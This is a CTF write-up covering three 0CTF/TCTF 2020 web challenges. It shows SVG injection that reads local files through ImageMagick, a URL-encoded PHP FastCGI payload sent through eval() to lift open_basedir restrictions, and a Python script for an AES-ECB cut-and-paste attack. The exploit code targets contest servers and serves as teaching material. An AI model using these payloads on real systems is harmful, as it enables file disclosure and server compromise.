---
title: "0ctf tctf2020quals writeups"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "lfi", "side-channel", "eval", "symlink"]
summary: "It's recommended to read our responsive web version of this writeup."
source:
  name: "balsn/ctf_writeup"
  url: "https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20200627-0ctf_tctf2020quals/README.md"
ctf:
  name: "0ctf tctf2020quals"
  year: 2020
---

## Source

- **CTF:** 0ctf tctf2020quals 2020
- **Repository:** [balsn/ctf_writeup](https://github.com/balsn/ctf_writeup)
- **File:** <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20200627-0ctf_tctf2020quals/README.md>

---
# 0CTF/TCTF 2020 Quals

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20200627-0ctf_tctf2020quals/) of this writeup.**


 - [0CTF/TCTF 2020 Quals](#0ctftctf-2020-quals)
   - [Web](#web)
     - [Wechat Generator](#wechat-generator)
     - [EasyPHP](#easyphp)
     - [lottery](#lottery)
     - [AMP 2020 (not solved)](#amp-2020-not-solved)
   - [Pwn](#pwn)
     - [Chromium RCE](#chromium-rce)
       - [Vulnerability](#vulnerability)
       - [Exploitation](#exploitation)
     - [Chromium SBX](#chromium-sbx)
       - [Vulnerability](#vulnerability-1)
       - [Exploitation](#exploitation-1)
     - [simple echoserver](#simple-echoserver)
     - [eeeeeemoji](#eeeeeemoji)
     - [Duet](#duet)
   - [Rev](#rev)
     - [flash-1](#flash-1)
     - [babymisc](#babymisc)
   - [Crypto](#crypto)
     - [babyring](#babyring)
     - [emmm](#emmm)
     - [Simple Curve](#simple-curve)
     - [sham](#sham)
     - [gene](#gene)
   - [Misc](#misc)
     - [PyAuCalc](#pyaucalc)
     - [eeemoji](#eeemoji)
     - [Cloud Computing v1](#cloud-computing-v1)
     - [Cloud Computing v2](#cloud-computing-v2)


## Web

### Wechat Generator

The webserver will generate a SVG image based on user input.

The user input is properly escaped, but the custom emoji part is not. A emoji named `""<h1>` will generate `<image xlink:href="http://pwnable.org:5000/static/emoji/"<h1>.png" />`. Basically we can inject everything with it.

The server also suppouts converting to different formats:

```
http://pwnable.org:5000/image/wtqlzU/svg
http://pwnable.org:5000/image/wtqlzU/jpg
http://pwnable.org:5000/image/wtqlzU/pdf
```

The title of `pdf` format is `magick-...`, so we can infer the backend will be using Imagemagick. Converting SVG in Imagemagick can lead to [local file inclusion](https://blog.bushwhackers.ru/googlectf-2019-gphotos-writeup/#imagemagickexploitation) by specifying href to `file:///etc/hosts`.

```
<image transform="scale(0.7,0.3)" x="-300" y="-400" width="1242" height="2208" href="file:///etc/os-release" />
```
The SVG support [some useful attributes](https://developer.mozilla.org/en-US/docs/Web/SVG/Element/image). They can be used to show more file content.

Read content in `/flag` we have:

```
Good job!
Now what's the next step?
```

So we probably need RCE or read other file. The webserver is using Python. We can guess the source code path `/app/app.py`, `/app/main.py`, `/app/server.py`, `/var/www/...` . It's at `/app/app.py`. (I'm not sure if it can be infered from other files.)

![](https://i.imgur.com/9t2MdLt.png)

First, `src|proc|env|meta` will be replaced. Next, there is a secret API `/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws`. Visiting this we will see a XSS challenge page asking us to pop `alert(1)`. After asking the admin in IRC he/she can confirm it's part of this challenge.

But we're too lazy to find a XSS in this domain. Wait, can we just pop an alert window in our own domain? It turns out it's YES. In the end we just use meta to redirect admin to our website and pop alert window. Then we get the juicy flag. The WAF can be easily bypassed.

```
[
foo" />
<mmetaeta http-equiv="refresh" content="0;url=https://lab.bookgin.tw/test/alert.html" />
<image xlink:href="bar
]
```

Flag: `flag{5Vg_1s_Pow3rFu1_y3T_D4n93r0u5_eba66e10}`

### EasyPHP

Solved by [kaibro](https://twitter.com/KAIKAIBRO), written by bookgin.

```
Disable functions:

set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl

open_basedir:

/var/www/html

unix_socket:

/var/run/php-fpm.sock
```

In the `/` there are `flag.h` and `flag.so`.

The idea is directly connecting to fastcgi and then overwrite `open_basedir`.


```
http://pwnable.org:19260/?rh=eval($_POST[1]);

1=echo%20123%3B%0Aclass%20FCGIClient%0A%7B%0A%20%20%20%20const%20VERSION_1%20%20%20%20%20%20%20%20%20%20%20%20%3D%201%3B%0A%20%20%20%20const%20BEGIN_REQUEST%20%20%20%20%20%20%20%20%3D%201%3B%0A%20%20%20%20const%20ABORT_REQUEST%20%20%20%20%20%20%20%20%3D%202%3B%0A%20%20%20%20const%20END_REQUEST%20%20%20%20%20%20%20%20%20%20%3D%203%3B%0A%20%20%20%20const%20PARAMS%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%204%3B%0A%20%20%20%20const%20STDIN%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%205%3B%0A%20%20%20%20const%20STDOUT%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%206%3B%0A%20%20%20%20const%20STDERR%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%207%3B%0A%20%20%20%20const%20DATA%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%208%3B%0A%20%20%20%20const%20GET_VALUES%20%20%20%20%20%20%20%20%20%20%20%3D%209%3B%0A%20%20%20%20const%20GET_VALUES_RESULT%20%20%20%20%3D%2010%3B%0A%20%20%20%20const%20UNKNOWN_TYPE%20%20%20%20%20%20%20%20%20%3D%2011%3B%0A%20%20%20%20const%20MAXTYPE%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%20self%3A%3AUNKNOWN_TYPE%3B%0A%20%20%20%20const%20RESPONDER%20%20%20%20%20%20%20%20%20%20%20%20%3D%201%3B%0A%20%20%20%20const%20AUTHORIZER%20%20%20%20%20%20%20%20%20%20%20%3D%202%3B%0A%20%20%20%20const%20FILTER%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%203%3B%0A%20%20%20%20const%20REQUEST_COMPLETE%20%20%20%20%20%3D%200%3B%0A%20%20%20%20const%20CANT_MPX_CONN%20%20%20%20%20%20%20%20%3D%201%3B%0A%20%20%20%20const%20OVERLOADED%20%20%20%20%20%20%20%20%20%20%20%3D%202%3B%0A%20%20%20%20const%20UNKNOWN_ROLE%20%20%20%20%20%20%20%20%20%3D%203%3B%0A%20%20%20%20const%20MAX_CONNS%20%20%20%20%20%20%20%20%20%20%20%20%3D%20%27MAX_CONNS%27%3B%0A%20%20%20%20const%20MAX_REQS%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%20%27MAX_REQS%27%3B%0A%20%20%20%20const%20MPXS_CONNS%20%20%20%20%20%20%20%20%20%20%20%3D%20%27MPXS_CONNS%27%3B%0A%20%20%20%20const%20HEADER_LEN%20%20%20%20%20%20%20%20%20%20%20%3D%208%3B%0A%0A%20%20%20%20private%20%24_sock%20%3D%20null%3B%0A%20%20%20%20%0A%20%20%20%20private%20%24_host%20%3D%20null%3B%0A%20%20%20%20%0A%20%20%20%20private%20%24_port%20%3D%20null%3B%0A%20%20%20%0A%20%20%20%20private%20%24_keepAlive%20%3D%20false%3B%0A%20%20%20%20%0A%20%20%20%20public%20function%20__construct%28%24host%2C%20%24port%20%3D%209000%29%20%2f%2f%20and%20default%20value%20for%20port%2C%20just%20for%20unixdomain%20socket%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24this-%3E_host%20%3D%20%24host%3B%0A%20%20%20%20%20%20%20%20%24this-%3E_port%20%3D%20%24port%3B%0A%20%20%20%20%7D%0A%20%20%20%20%0A%20%20%20%20public%20function%20setKeepAlive%28%24b%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24this-%3E_keepAlive%20%3D%20%28boolean%29%24b%3B%0A%20%20%20%20%20%20%20%20if%20%28%21%24this-%3E_keepAlive%20%26%26%20%24this-%3E_sock%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20fclose%28%24this-%3E_sock%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20public%20function%20getKeepAlive%28%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20return%20%24this-%3E_keepAlive%3B%0A%20%20%20%20%7D%0A%20%20%20%20private%20function%20connect%28%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20if%20%28%21%24this-%3E_sock%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24this-%3E_sock%20%3D%20fsockopen%28%24this-%3E_host%2C%20%24this-%3E_port%2C%20%24errno%2C%20%24errstr%2C%205%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%21%24this-%3E_sock%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20throw%20new%20Exception%28%27Unable%20to%20connect%20to%20FastCGI%20application%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20private%20function%20buildPacket%28%24type%2C%20%24content%2C%20%24requestId%20%3D%201%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24clen%20%3D%20strlen%28%24content%29%3B%0A%20%20%20%20%20%20%20%20return%20chr%28self%3A%3AVERSION_1%29%20%20%20%20%20%20%20%20%20%2f%2a%20version%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20.%20chr%28%24type%29%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2f%2a%20type%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20.%20chr%28%28%24requestId%20%3E%3E%208%29%20%26%200xFF%29%20%2f%2a%20requestIdB1%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20.%20chr%28%24requestId%20%26%200xFF%29%20%20%20%20%20%20%20%20%2f%2a%20requestIdB0%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20.%20chr%28%28%24clen%20%3E%3E%208%20%29%20%26%200xFF%29%20%20%20%20%20%2f%2a%20contentLengthB1%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20.%20chr%28%24clen%20%26%200xFF%29%20%20%20%20%20%20%20%20%20%20%20%20%20%2f%2a%20contentLengthB0%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20.%20chr%280%29%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2f%2a%20paddingLength%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20.%20chr%280%29%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2f%2a%20reserved%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20.%20%24content%3B%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2f%2a%20content%20%2a%2f%0A%20%20%20%20%7D%0A%20%20%20%20private%20function%20buildNvpair%28%24name%2C%20%24value%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24nlen%20%3D%20strlen%28%24name%29%3B%0A%20%20%20%20%20%20%20%20%24vlen%20%3D%20strlen%28%24value%29%3B%0A%20%20%20%20%20%20%20%20if%20%28%24nlen%20%3C%20128%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2f%2a%20nameLengthB0%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20%24nvpair%20%3D%20chr%28%24nlen%29%3B%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2f%2a%20nameLengthB3%20%26%20nameLengthB2%20%26%20nameLengthB1%20%26%20nameLengthB0%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20%24nvpair%20%3D%20chr%28%28%24nlen%20%3E%3E%2024%29%20%7C%200x80%29%20.%20chr%28%28%24nlen%20%3E%3E%2016%29%20%26%200xFF%29%20.%20chr%28%28%24nlen%20%3E%3E%208%29%20%26%200xFF%29%20.%20chr%28%24nlen%20%26%200xFF%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20if%20%28%24vlen%20%3C%20128%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2f%2a%20valueLengthB0%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20%24nvpair%20.%3D%20chr%28%24vlen%29%3B%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2f%2a%20valueLengthB3%20%26%20valueLengthB2%20%26%20valueLengthB1%20%26%20valueLengthB0%20%2a%2f%0A%20%20%20%20%20%20%20%20%20%20%20%20%24nvpair%20.%3D%20chr%28%28%24vlen%20%3E%3E%2024%29%20%7C%200x80%29%20.%20chr%28%28%24vlen%20%3E%3E%2016%29%20%26%200xFF%29%20.%20chr%28%28%24vlen%20%3E%3E%208%29%20%26%200xFF%29%20.%20chr%28%24vlen%20%26%200xFF%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%2f%2a%20nameData%20%26%20valueData%20%2a%2f%0A%20%20%20%20%20%20%20%20return%20%24nvpair%20.%20%24name%20.%20%24value%3B%0A%20%20%20%20%7D%0A%20%20%20%20private%20function%20decodePacketHeader%28%24data%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24ret%20%3D%20array%28%29%3B%0A%20%20%20%20%20%20%20%20%24ret%5B%27version%27%5D%20%20%20%20%20%20%20%3D%20ord%28%24data%7B0%7D%29%3B%0A%20%20%20%20%20%20%20%20%24ret%5B%27type%27%5D%20%20%20%20%20%20%20%20%20%20%3D%20ord%28%24data%7B1%7D%29%3B%0A%20%20%20%20%20%20%20%20%24ret%5B%27requestId%27%5D%20%20%20%20%20%3D%20%28ord%28%24data%7B2%7D%29%20%3C%3C%208%29%20%2b%20ord%28%24data%7B3%7D%29%3B%0A%20%20%20%20%20%20%20%20%24ret%5B%27contentLength%27%5D%20%3D%20%28ord%28%24data%7B4%7D%29%20%3C%3C%208%29%20%2b%20ord%28%24data%7B5%7D%29%3B%0A%20%20%20%20%20%20%20%20%24ret%5B%27paddingLength%27%5D%20%3D%20ord%28%24data%7B6%7D%29%3B%0A%20%20%20%20%20%20%20%20%24ret%5B%27reserved%27%5D%20%20%20%20%20%20%3D%20ord%28%24data%7B7%7D%29%3B%0A%20%20%20%20%20%20%20%20return%20%24ret%3B%0A%20%20%20%20%7D%0A%20%20%20%20private%20function%20readPacket%28%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20if%20%28%24packet%20%3D%20fread%28%24this-%3E_sock%2C%20self%3A%3AHEADER_LEN%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24resp%20%3D%20%24this-%3EdecodePacketHeader%28%24packet%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24resp%5B%27content%27%5D%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%24resp%5B%27contentLength%27%5D%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24len%20%20%3D%20%24resp%5B%27contentLength%27%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20while%20%28%24len%20%26%26%20%24buf%3Dfread%28%24this-%3E_sock%2C%20%24len%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24len%20-%3D%20strlen%28%24buf%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24resp%5B%27content%27%5D%20.%3D%20%24buf%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%24resp%5B%27paddingLength%27%5D%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24buf%3Dfread%28%24this-%3E_sock%2C%20%24resp%5B%27paddingLength%27%5D%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24resp%3B%0A%20%20%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20public%20function%20request%28array%20%24params%2C%20%24stdin%29%0A%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%24response%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20%24this-%3Econnect%28%29%3B%0A%20%20%20%20%20%20%20%20%24request%20%3D%20%24this-%3EbuildPacket%28self%3A%3ABEGIN_REQUEST%2C%20chr%280%29%20.%20chr%28self%3A%3ARESPONDER%29%20.%20chr%28%28int%29%20%24this-%3E_keepAlive%29%20.%20str_repeat%28chr%280%29%2C%205%29%29%3B%0A%20%20%20%20%20%20%20%20%24paramsRequest%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%20%20foreach%20%28%24params%20as%20%24key%20%3D%3E%20%24value%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24paramsRequest%20.%3D%20%24this-%3EbuildNvpair%28%24key%2C%20%24value%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20if%20%28%24paramsRequest%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24request%20.%3D%20%24this-%3EbuildPacket%28self%3A%3APARAMS%2C%20%24paramsRequest%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%24request%20.%3D%20%24this-%3EbuildPacket%28self%3A%3APARAMS%2C%20%27%27%29%3B%0A%20%20%20%20%20%20%20%20if%20%28%24stdin%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24request%20.%3D%20%24this-%3EbuildPacket%28self%3A%3ASTDIN%2C%20%24stdin%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%24request%20.%3D%20%24this-%3EbuildPacket%28self%3A%3ASTDIN%2C%20%27%27%29%3B%0A%20%20%20%20%20%20%20%20fwrite%28%24this-%3E_sock%2C%20%24request%29%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24resp%20%3D%20%24this-%3EreadPacket%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20%28%24resp%5B%27type%27%5D%20%3D%3D%20self%3A%3ASTDOUT%20%7C%7C%20%24resp%5B%27type%27%5D%20%3D%3D%20self%3A%3ASTDERR%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24response%20.%3D%20%24resp%5B%27content%27%5D%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%20while%20%28%24resp%20%26%26%20%24resp%5B%27type%27%5D%20%21%3D%20self%3A%3AEND_REQUEST%29%3B%0A%20%20%20%20%20%20%20%20if%20%28%21is_array%28%24resp%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20throw%20new%20Exception%28%27Bad%20request%27%29%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20switch%20%28ord%28%24resp%5B%27content%27%5D%7B4%7D%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20case%20self%3A%3ACANT_MPX_CONN%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20throw%20new%20Exception%28%27This%20app%20can%5C%27t%20multiplex%20%5BCANT_MPX_CONN%5D%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20case%20self%3A%3AOVERLOADED%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20throw%20new%20Exception%28%27New%20request%20rejected%3B%20too%20busy%20%5BOVERLOADED%5D%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20case%20self%3A%3AUNKNOWN_ROLE%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20throw%20new%20Exception%28%27Role%20value%20not%20known%20%5BUNKNOWN_ROLE%5D%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20break%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20case%20self%3A%3AREQUEST_COMPLETE%3A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24response%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%7D%0A%0A%24connect_path%20%3D%20%27unix%3A%2f%2f%2fvar%2frun%2fphp-fpm.sock%27%3B%0A%24port%20%3D%20-1%3B%0A%24filepath%20%3D%20%27%2fvar%2fwww%2fhtml%2findex.php%27%3B%0A%24req%20%3D%20%27%2f%27%20.%20basename%28%24filepath%29%3B%0A%24uri%20%3D%20%24req%3B%0A%24client%20%3D%20new%20FCGIClient%28%24connect_path%2C%20%24port%29%3B%0A%24php_value%20%3D%20%22allow_url_include%20%3D%20On%5Cnopen_basedir%20%3D%20%2f%22%3B%0A%24params%20%3D%20array%28%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%27GATEWAY_INTERFACE%27%20%3D%3E%20%27FastCGI%2f1.0%27%2C%0A%20%20%20%20%20%20%20%20%27REQUEST_METHOD%27%20%20%20%20%3D%3E%20%27GET%27%2C%0A%20%20%20%20%20%20%20%20%27SCRIPT_FILENAME%27%20%20%20%3D%3E%20%24filepath%2C%0A%20%20%20%20%20%20%20%20%27SCRIPT_NAME%27%20%20%20%20%20%20%20%3D%3E%20%24req%2C%0A%20%20%20%20%20%20%20%20%27REQUEST_URI%27%20%20%20%20%20%20%20%3D%3E%20%24uri%2C%0A%20%20%20%20%20%20%20%20%27DOCUMENT_URI%27%20%20%20%20%20%20%3D%3E%20%24req%2C%0A%20%20%20%20%20%20%20%20%27PHP_VALUE%27%20%20%20%20%20%20%20%20%20%3D%3E%20%24php_value%2C%0A%20%20%20%20%20%20%20%20%27SERVER_SOFTWARE%27%20%20%20%3D%3E%20%27kaibro-fastcgi-rce%27%2C%0A%20%20%20%20%20%20%20%20%27REMOTE_ADDR%27%20%20%20%20%20%20%20%3D%3E%20%27127.0.0.1%27%2C%0A%20%20%20%20%20%20%20%20%27REMOTE_PORT%27%20%20%20%20%20%20%20%3D%3E%20%279985%27%2C%0A%20%20%20%20%20%20%20%20%27SERVER_ADDR%27%20%20%20%20%20%20%20%3D%3E%20%27127.0.0.1%27%2C%0A%20%20%20%20%20%20%20%20%27SERVER_PORT%27%20%20%20%20%20%20%20%3D%3E%20%2780%27%2C%0A%20%20%20%20%20%20%20%20%27SERVER_NAME%27%20%20%20%20%20%20%20%3D%3E%20%27localhost%27%2C%0A%20%20%20%20%20%20%20%20%27SERVER_PROTOCOL%27%20%20%20%3D%3E%20%27HTTP%2f1.1%27%2C%0A%20%20%20%20%20%20%20%20%29%3B%0Aecho%20%22Call%3A%20%24uri%5Cn%5Cn%22%3B%0Aecho%20%24client-%3Erequest%28%24params%2C%20NULL%29%3B

echo base64_encode(file_get_contents("/flag.so"));
```

The flag is `flag{FFi_1s_qu1T3_DANg1ouS}`.

### lottery

This is more like a crypto challenge.

The lottery is encrypted using AES-ECB mode, so the idea here is cut-and-paste attack.

```
0  { 'lottery': '19 | d5b3a52053c345b1f6581f62af2cc374
1  7e66b8-c0d5-4f05 | bdd3e814eaf73146bb0dbe98a9d61508
2  -962f-c18e2c7d82 | 7dcecb8a3ccd69b0c5a578f3fa6ba7fd
3  ef', 'user': '32 | c6802e48a5597c58a876d86be98bb6e5
4  edaac1-c828-4b41 | b22150f5c3204374f0a03a1906430cc1
5  -9da0-6d32cfa7c5 | 1e14e0ce6e77c2c1aa2482a02e439e96
6  a6', 'coin': 5 } | 08fa0515a89e650da6e5ad932497af4e
7  (padding)        | f6d2b7dade603f007022388485ecc598
```

The plaintext and ciphertext are shown above. Note there are some weird space between. The coin here is not useful because the server will only give the corresponding coin according to the lottery id.

The idea is cut-and-paste the block to overwrite the `user`. Then if we register a quantity of users, we can profit!

Given another new lottery plaintext and ciphertext:

```
A  { 'lottery': '66 | 80d2d4f735ad8344475d0fb6d0001a73
B  801483-93d0-42e8 | 77823dbb161e2e4c3143da08e3eb87e4
C  -b867-8dc2d54dcf | 9a84b5f07896a60246c74e31263eeb1c
D  18', 'user': 'ef | 4ea572ddf1709c16a017e50e9ccf60ae
E  e21533-603f-47fe | 957865140c8014d09a16be6fb9651719
F  -8e37-8667fc86ed | 675ffd20ab06ac7917f26fa0eb089571
G  43', 'coin': 9 } | fb9a264302e0741b78d177f67fe0c4d0
H                   | f6d2b7dade603f007022388485ecc598
```

We cut the first 4 block `ABCD` here because they include the lottery block. As mention below the `coin` attribute is useless on the server side.

```
A  { 'lottery': '66 | 80d2d4f735ad8344475d0fb6d0001a73
B  801483-93d0-42e8 | 77823dbb161e2e4c3143da08e3eb87e4
C  -b867-8dc2d54dcf | 9a84b5f07896a60246c74e31263eeb1c
D  18', 'user': 'ef | 4ea572ddf1709c16a017e50e9ccf60ae
```

Next, combine with our original block `34567`, we have:

```
A  { 'lottery': '66 | 80d2d4f735ad8344475d0fb6d0001a73
B  801483-93d0-42e8 | 77823dbb161e2e4c3143da08e3eb87e4
C  -b867-8dc2d54dcf | 9a84b5f07896a60246c74e31263eeb1c
D  18', 'user': 'ef | 4ea572ddf1709c16a017e50e9ccf60ae
3  ef', 'user': '32 | c6802e48a5597c58a876d86be98bb6e5
4  edaac1-c828-4b41 | b22150f5c3204374f0a03a1906430cc1
5  -9da0-6d32cfa7c5 | 1e14e0ce6e77c2c1aa2482a02e439e96
6  a6', 'coin': 5 } | 08fa0515a89e650da6e5ad932497af4e
7  (padding)        | f6d2b7dade603f007022388485ecc598
```

We're abusing the fact that JSON can have duplicated attributes, and the latter will overwrite the former. Regarding `coin`, as mention below the server will not use it to determine the lottery prize. Instead, it depends on the lottery id.


Here is the full payload:

```python
#!/usr/bin/env python3
import requests
import secrets, json, base64


def dec(req, enc):
    r = req.post('http://pwnable.org:2333/lottery/info', data=dict(enc=enc)).json()['info']
    print(r)
    crypts = base64.b64decode(enc.encode())
    crypts = [crypts[i*16: (i+1)*16].hex() for i in range(8)]
    plains = repr(r).replace('{', '{ ').replace('}', ' }')
    plains = [plains[i*16: (i+1)*16] for i in range(8)]
    for plain, crypt in zip(plains, crypts):
        print('>>>', plain, '|', crypt, '<<<')
    return crypts

# create main account
s = requests.session()
name = 'Balsn1002142092'#secrets.token_urlsafe(16)
data = dict(username=name, password=name)
r = s.post('http://pwnable.org:2333/user/register', data=data).json()
r = s.post('http://pwnable.org:2333/user/login', data=data).json()
print(json.dumps(r, indent=2))
uid, tok = r['user']['uuid'], r['user']['api_token']
print(uid, tok)

enc = s.post('http://pwnable.org:2333/lottery/buy', data=dict(api_token=tok)).json()['enc']
crypts = dec(s, enc)
'''
we only need block 3' - 7'
main 
0' { 'lottery': '19 | d5b3a52053c345b1f6581f62af2cc374
1' 7e66b8-c0d5-4f05 | bdd3e814eaf73146bb0dbe98a9d61508
2' -962f-c18e2c7d82 | 7dcecb8a3ccd69b0c5a578f3fa6ba7fd
3' ef', 'user': '32 | c6802e48a5597c58a876d86be98bb6e5
4' edaac1-c828-4b41 | b22150f5c3204374f0a03a1906430cc1
5' -9da0-6d32cfa7c5 | 1e14e0ce6e77c2c1aa2482a02e439e96
6' a6', 'coin': 5 } | 08fa0515a89e650da6e5ad932497af4e
7'                  | f6d2b7dade603f007022388485ecc598

dummy
we only need block 0' - 3'
main 
0 { 'lottery': '66 | 80d2d4f735ad8344475d0fb6d0001a73
1 801483-93d0-42e8 | 77823dbb161e2e4c3143da08e3eb87e4
2 -b867-8dc2d54dcf | 9a84b5f07896a60246c74e31263eeb1c
3 18', 'user': 'ef | 4ea572ddf1709c16a017e50e9ccf60ae
4 e21533-603f-47fe | 957865140c8014d09a16be6fb9651719
5 -8e37-8667fc86ed | 675ffd20ab06ac7917f26fa0eb089571
6 43', 'coin': 9 } | fb9a264302e0741b78d177f67fe0c4d0
7                  | f6d2b7dade603f007022388485ecc598
'''
coin = 20
while coin <= 99:
    n = requests.session()
    n_name = name + secrets.token_urlsafe(8)
    n_data = dict(username=n_name, password=n_name)
    r = n.post('http://pwnable.org:2333/user/register', data=n_data).json()
    r = n.post('http://pwnable.org:2333/user/login', data=n_data).json()
    print(json.dumps(r, indent=2))
    n_uid, n_tok = r['user']['uuid'], r['user']['api_token']
    print(n_uid, n_tok)
    n_enc = n.post('http://pwnable.org:2333/lottery/buy', data=dict(api_token=n_tok)).json()['enc']
    n_crypts = dec(n, n_enc)
    new_crypts = n_crypts[:4] + crypts[3:]
    new_enc = base64.b64encode(bytes.fromhex(''.join(new_crypts))).decode()
    print('=======new block============')
    dec(s, new_enc)
    print('============================')
